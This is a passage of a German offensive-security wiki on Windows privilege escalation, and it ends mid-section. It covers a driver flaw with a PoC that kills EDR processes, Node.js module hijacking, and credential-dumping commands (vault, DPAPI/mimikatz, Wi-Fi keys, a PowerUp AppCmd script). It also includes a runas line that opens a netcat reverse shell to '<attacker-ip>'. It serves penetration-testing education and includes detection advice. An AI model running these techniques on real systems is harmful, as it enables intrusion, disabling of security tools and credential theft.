Starkes Suchmuster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesevorgang bestimmt, ob ein zweiter erfolgt.

#### Missbrauch von fehlendem FILE_DEVICE_SECURE_OPEN bei Geräteobjekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einem starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad mit einer zusätzlichen Komponente geöffnet wird. Dadurch kann jeder nicht privilegierte Benutzer einen Handle erhalten, indem er einen Namespace-Pfad wie diesen verwendet:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In freier Wildbahn beobachtete Beispiele für solche Möglichkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Unbeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Tricks für Boot-Persistenz).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch sich AV/EDR aus dem Userland über den Kernel beenden lassen.

Minimales PoC-Muster (Usermode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Gegenmaßnahmen für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn du Geräteobjekte erstellst, die durch eine DACL eingeschränkt werden sollen.
- Validiere den Kontext des Aufrufers bei privilegierten Vorgängen. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder die Rückgabe von Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe brokerbasierte Modelle anstelle direkter Kernel-Berechtigungen in Betracht.

Erkennungshinweise für Verteidiger
- Überwache benutzermodusseitige Zugriffe auf verdächtige Gerätenamen (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge die Microsoft-Sperrliste für anfällige Treiber (HVCI/WDAC/Smart App Control) und pflege eigene Zulassungs-/Sperrlisten.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL kapern und **deine Berechtigungen erweitern**.<sup>[[2]](#references)</sup>

Prüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie sich diese Prüfung ausnutzen lässt:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js- / Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **uncontrolled search path unter Windows**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node sucht nach Paketen, indem es im Verzeichnisbaum nach oben geht und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann die Suche bis zum Laufwerksstamm reichen. Daher kann eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wurde, Folgendes durchsuchen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine schädliche Datei `foo.js` (oder einen Paketordner) dort platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, sobald das Ziel als Administrator, über eine geplante Aufgabe/einen Service-Wrapper mit erhöhten Berechtigungen oder über eine automatisch gestartete Desktop-App mit erhöhten Berechtigungen ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Bibliothek eines Drittanbieters `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode befindet

### Anfällige Ziele suchen

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zieldatei (`node.exe`, die EXE der Electron-App oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und den letzten erfolgreichen Zugriff unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder einer Überprüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Anwendung des Opfers aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Zu den realen Beispielen für fehlende optionale Module, die diesem Muster entsprechen, gehören `bluebird` und `utf-8-validate`. Die **Technik** ist jedoch der wiederverwendbare Teil: Finden Sie einen beliebigen **fehlenden bare import**, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsideen

- Alarmieren Sie, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages ablegt.
- Suchen Sie nach Prozessen mit hoher Integrität, die auf `C:\node_modules\*` zugreifen.
- Packen Sie alle Runtime-Abhängigkeiten in Produktionsumgebungen mit ein und prüfen Sie die Verwendung von `optionalDependencies`.
- Prüfen Sie Code von Drittanbietern auf stille Muster wie `try { require("...") } catch {}`.
- Deaktivieren Sie optionale Prüfungen, wenn die Bibliothek dies unterstützt (beispielsweise können einige `ws`-Deployments die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfe, ob weitere bekannte Computer in der hosts-Datei fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Von außen nach **eingeschränkten Diensten** suchen.

```bash
netstat -ano #Opened ports?
```

Bei einem lokalen Listener sollten Sie seine PID dem Prozesseigner, dem ausführbaren Pfad und einem Dienst oder einer geplanten Aufgabe zuordnen, der bzw. die ihn startet. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktopbenutzer ermöglichen, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die unter einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherkorruption eine Analyse genau dieser Binärdatei und der für sie erreichbaren Eingaben erfordert. Wenn ein exponierter Port offenbar zu einem Systemprozess gehört, vergleichen Sie ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor Sie den Backend-Dienst zuordnen; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Weitere[ Befehle zur Netzwerkaufzählung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du Root-Rechte erhältst, kannst du auf jedem Port lauschen (beim ersten Mal, wenn du `nc.exe` zum Lauschen auf einem Port verwendest, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um `bash` ganz einfach als `root` zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

`root` unter Linux in WSL gewährt für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, solltest du Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle prüfen, in denen möglicherweise Zugangsdaten aufgezeichnet wurden. Für eine Rechteausweitung sind weiterhin ein gültiges Konto mit höheren Berechtigungen und ein zulässiger Authentifizierungspfad erforderlich. Das Layout `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution üblicherweise auf einer [virtuellen Festplatte vom Typ `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Gib bei automatisierten Prüfungen keine Verlaufsinhalte aus.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Zugangsdaten. Ein nichtleerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort auslesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Lesezugriffe belegen weder, ob dieses Geheimnis existiert, noch, ob es abgerufen werden kann. Prüfe Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Zunächst könnte das so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen, aber so funktioniert es nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (einen Server oder eine Website) **zuzugreifen, diesen Credential Manager** und Windows Vault nutzen und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben müssen.

Wenn Anwendungen nicht mit Credential Manager interagieren, können sie meiner Meinung nach die Anmeldeinformationen für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Vault nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Vault-Speicher anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit bereitgestellten Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire-Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstokens und Klartextpasswörter im Universal Windows Platform (UWP) `PasswordVault` (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ ohne Administratorrechte oder `SeDebugPrivilege` entschlüsselt werden.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter auszulesen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Bei dieser Verschlüsselung wird ein Benutzer- oder Systemgeheimnis genutzt, um die Entropie deutlich zu erhöhen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden stattdessen die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Benutzerschlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Master Key zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht normalerweise aus 64 Byte zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und sein Inhalt daher nicht mit dem Befehl `dir` in CMD aufgelistet werden kann, wohl aber mit PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) entschlüsseln.

Die **durch das Master-Passwort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele DPAPI-**masterkeys** aus dem **Arbeitsspeicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Sie werden mit **DPAPI** geschützt, was in der Regel bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventur auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, anstatt `C:\Users` anzunehmen: [Windows kann Profile an anderen Speicherorten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss separat über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zunächst Pfade und ACLs, ohne bei der routinemäßigen Enumeration verschlüsselte oder unverschlüsselte Werte auszugeben.

Um PS-Anmeldeinformationen aus der Datei zu **entschlüsseln**, in der sie enthalten sind, kannst du Folgendes tun:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Kürzlich ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Remotedesktop-Anmeldeinformationsverwaltung**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` können Sie **viele DPAPI-Masterkeys** aus dem Arbeitsspeicher **extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuchen Sie lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Dokumenten der Benutzer, auch Dateien mit gewöhnlichen Namen wie `config.xml`. Ermitteln Sie das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor Sie eine XML-Datei als möglichen Fundort von Anmeldedaten einstufen. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei ab und davon, ob ein benutzerdefiniertes Masterpasswort verwendet wurde. Vermeiden Sie es, verschlüsselte Werte bei einer umfassenden Suche auszugeben.

**Profil-Exporte von Remote Desktop Plus** können ebenfalls in Benutzerverzeichnissen oder einem gemeinsam genutzten Administrationsordner lesbar sein. Ein älterer Export namens `profiles.xml` enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Betrachten Sie ein nicht leeres Passwortelement als möglichen Fundort von Anmeldedaten, ohne es auszugeben oder davon auszugehen, dass es im Klartext vorliegt: [der Hersteller weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden sein oder weniger streng konfiguriert werden kann. Bestätigen Sie Herkunft und Wiederherstellungsbedingungen der Datei, bevor Sie sich darauf verlassen.

### Sticky Notes

Manchmal speichern Menschen Passwörter und andere Informationen in Haftnotiz-Apps. Die von Microsoft bereitgestellte Sticky Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermitteln Sie die installierte App und das Speicherformat, bevor Sie aus einer fehlenden SQLite-Datei schließen, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, enthält eine Kopie von `plum.sqlite` allein möglicherweise nicht die zuletzt bestätigten Notizen. Bewahren Sie `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und beziehen Sie nach Möglichkeit auch `plum.sqlite-shm` ein; der Index im gemeinsam genutzten Speicher kann neu erstellt werden, die WAL-Datei ist jedoch Teil des persistenten Datenbankzustands. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Fundort von Anmeldedaten: Überprüfen Sie das Konto, den zulässigen Zugriff und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag in einem Passwortmanager erfordert zusätzlich den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er eine Anmeldung mit höheren Berechtigungen belegen kann.

### AppCmd.exe

**Beachten Sie, dass Sie Administrator sein und mit einer hohen Integritätsstufe arbeiten müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, wurden möglicherweise **Anmeldedaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) übernommen:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt; viele sind anfällig für DLL Sideloading (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Zugangsdaten-Artefakte in der Registry von Support-Tools

Einige ältere Remote-Support-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln bei. So bezeichnete `SecurityPasswordAES` von TeamViewer in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort, wie aus der [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) hervorgeht. Ein Wertnamen-Marker ist lediglich ein Hinweis für die Überprüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und eine Berechtigung für dieses Konto besteht. Geben Sie verschlüsselte Werte und wiederhergestellte Passwörter nicht in routinemäßigen Enumeration-Ausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn vermutet wird, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und dem Schutz von Arbeitsblättern oder ausgeblendeten Spalten. [Microsoft weist darauf hin](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung steuert und keine Sicherheitsfunktion ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, mögliche Geheimnisse bei breit angelegter Enumeration auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat; verifizieren Sie die tatsächlichen Daten und die aktuellen Kontoberechtigungen separat.

### Vom CI-Server aufbewahrte Änderungs-Patches

